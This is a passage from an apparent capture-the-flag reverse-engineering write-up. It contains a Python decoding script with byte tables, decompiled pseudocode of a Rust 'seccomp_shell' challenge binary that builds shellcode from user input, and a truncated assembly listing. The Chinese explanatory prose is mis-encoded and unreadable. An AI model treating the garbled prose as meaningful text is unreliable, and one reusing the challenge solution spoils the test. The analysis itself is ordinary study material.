number\">0xE9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x62</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x96</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x13</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x53</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x33</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x29</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x44</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x31</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x34</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x54</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x92</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token number\">0xFC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x85</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x07</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x19</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x72</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x98</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x46</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x76</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x67</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x57</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x26</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x84</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x91</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x05</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x87</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x73</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x21</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x49</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x55</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x37</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x56</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x82</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x95</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>load_data <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0xA7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x51</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x85</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x27</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x31</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x88</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x87</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x55</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x27</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x94</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x86</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x91</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xED</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x84</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x43</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x07</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>crypto_table <span class=\"token operator\">=</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">zip</span><span class=\"token punctuation\">(</span>s0_255<span class=\"token punctuation\">,</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">#get order table</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>source <span class=\"token operator\">=</span> <span class=\"token string\">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;'</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>replaced <span class=\"token operator\">=</span> <span class=\"token string\">'HfVl&#123;qPcCYNMoRi6D7Jr&#125;espOL3FhwdWAtTGZba4Ugjvnx1QkKE2IS9yuz5BX08m'</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>revsere_table <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token comment\">#index æ˜¯ source åœ¨ replace ä¸­çš„ä¸‹æ ‡</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> source<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    revsere_table<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>replaced<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>tmp <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x26</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x09</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x55</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x97</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x66</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x67</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x87</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x53</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x62</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x88</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x13</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x69</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x86</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x92</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    tmp <span class=\"token operator\">=</span> decrypt<span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">,</span> crypto_table<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    tmp <span class=\"token operator\">=</span> reverse_order<span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">,</span> revsere_table<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> tmp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\"># 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;</span></pre></td></tr></table></figure><p>ä»¥ä¸Šè„šæœ¬ç”¨äºè¿˜åŸ æ’åº + åŠ å¯†ï¼Œtmp çš„å€¼å°±æ˜¯ç»å†è¿‡å®Œæ•´çš„æ‰“ä¹±é¡ºåºå’ŒåŠ å¯†å dump å‡ºçš„ï¼Œå¹¶ä¸æ˜¯æœ€ç»ˆçš„ cmp_data</p>\n<p>è¯´æ˜è¦ä¹ˆæ˜¯æ¯”è¾ƒæ•°æ®è¿˜æœ‰æ“ä½œ è¦ä¹ˆæ˜¯ input è¿˜æœ‰æ“ä½œ</p>\n<p>ç»§ç»­å¾€åé¢çœ‹ æ¯”è¾ƒé€»è¾‘</p>\n<p><img data-src=\"/images/image-20230910153719912.png\" alt=\"image-20230910153719912\"></p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>like_i <span class=\"token operator\">=</span> <span class=\"token number\">4LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    v77 <span class=\"token operator\">=</span> v84<span class=\"token punctuation\">;</span>                                  <span class=\"token comment\">// 0xff</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v84 <span class=\"token operator\">&lt;</span> <span class=\"token number\">205</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>      <span class=\"token keyword\">goto</span> LABEL_74<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>v78 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>dest <span class=\"token operator\">+</span> like_i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    v79 <span class=\"token operator\">=</span> v82<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    v82<span class=\"token punctuation\">[</span><span class=\"token number\">204</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> input<span class=\"token punctuation\">[</span>like_i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v77 <span class=\"token operator\">&lt;</span> <span class=\"token number\">224</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      <span class=\"token keyword\">goto</span> LABEL_74<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    v79<span class=\"token punctuation\">[</span><span class=\"token number\">223</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v78<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    v79<span class=\"token punctuation\">[</span><span class=\"token number\">205</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> input<span class=\"token punctuation\">[</span>like_i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v77 <span class=\"token operator\">==</span> <span class=\"token number\">224</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      <span class=\"token keyword\">goto</span> LABEL_74<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    v79<span class=\"token punctuation\">[</span><span class=\"token number\">224</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v78<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    v79<span class=\"token punctuation\">[</span><span class=\"token number\">206</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> input<span class=\"token punctuation\">[</span>like_i <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v77 <span class=\"token operator\">&lt;</span> <span class=\"token number\">226</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      <span class=\"token keyword\">goto</span> LABEL_74<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    v79<span class=\"token punctuation\">[</span><span class=\"token number\">225</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v78<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    v79<span class=\"token punctuation\">[</span><span class=\"token number\">207</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> input<span class=\"token punctuation\">[</span>like_i <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v77 <span class=\"token operator\">==</span> <span class=\"token number\">226</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      <span class=\"token keyword\">goto</span> LABEL_74<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    v79<span class=\"token punctuation\">[</span><span class=\"token number\">226</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v78<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    _$LT$$RF$std<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>net<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>tcp<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>TcpStream$u20$as$u20$std<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>Write$GT$<span class=\"token double-colon punctuation\">::</span>write<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">h0bbfc2d1fa700c7a</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v81<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>      <span class=\"token keyword\">goto</span> LABEL_50<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    v81<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    v75 <span class=\"token operator\">=</span> std<span class=\"token double-colon punctuation\">::</span>io<span class=\"token double-colon punctuation\">::</span>default_read_exact<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">h61fb53e2a02eb302</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v85<span class=\"token punctuation\">,</span> v81<span class=\"token punctuation\">,</span> <span class=\"token number\">8LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v75 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>      <span class=\"token keyword\">goto</span> LABEL_55<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>v81<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>      <span class=\"token keyword\">goto</span> LABEL_70<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    v80 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int64<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>like_i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">60</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    like_i <span class=\"token operator\">+=</span> <span class=\"token number\">4LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v80 <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>æ¯æ¬¡æ˜¯èµ‹å€¼äº† input çš„ 4 ä¸ªå­—èŠ‚ å’Œæ¯”è¾ƒæ•°æ®çš„å››ä¸ªå­—èŠ‚ ä½†æ˜¯ä¸æ¸…æ¥šè·‘å“ªé‡Œå»äº†</p>\n<p>è€Œ v79 [204]  v79 [205]  v79 [206]  v79 [207] æ˜¯æ ˆä¸­å›ºå®šçš„ä½ç½®ï¼Œä¸ºä»€ä¹ˆä¸‹æ ‡æ€ä¹ˆå¥‡æ€ªå‘¢ï¼Ÿ</p>\n<p>é€šè¿‡æŸ¥æ‰¾äº¤å‰å¼•ç”¨å¯ä»¥å‘ç°</p>\n<p><img data-src=\"/images/image-20230910154028581.png\" alt=\"image-20230910154028581\"></p>\n<p>v79 æ˜¯ä¸€å¼€å§‹ 255 å­—èŠ‚é•¿çš„ shellcode</p>\n<p><img data-src=\"/images/image-20230910154115378.png\" alt=\"image-20230910154115378\"></p>\n<p>IDA æœ‰äº›è¯†åˆ«ä¸å¤ªå‡†ç¡® åœ¨æ±‡ç¼–ä¸­æŸ¥çœ‹</p>\n<pre><code class=\"language-assembly\">.rodata:000055E808DA1B2B sub_55E808DA1B2B proc near              ; DATA XREF: seccomp_shell::shell::verify::h898bf5fa26dafbab+44Dâ†‘o\n.rodata:000055E808DA1B2B push    rsp\n.rodata:000055E808DA1B2C pop     rbp\n.rodata:000055E808DA1B2D xor     esi, esi                        ; flags\n.rodata:000055E808DA1B2F mov     rcx, 